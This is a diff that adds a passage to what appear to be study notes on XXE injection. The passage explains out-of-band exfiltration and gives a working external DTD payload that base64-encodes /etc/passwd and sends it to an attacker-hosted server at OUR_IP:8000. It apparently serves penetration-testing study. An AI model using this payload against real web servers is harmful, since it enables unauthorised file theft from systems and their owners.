@@ -87,4 +87,12 @@ If the normal page does not have anything we can use, we can attempt to trigger 
 
 Out of band Exfiltration:
 
-Even if we cannot 
+Even if we cannot perform normal exfiltration due to different reason, we can perform out of band exfiltration by using XXE Injection to have the webserver make request that contains the file content that we needed:
+
+Below is an example, we first save the below snippet to our webserver namely 
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+Here, we first use base64 encoding to encode the file passwd, then we use it as parameter and have the website make a request to a webserver we host
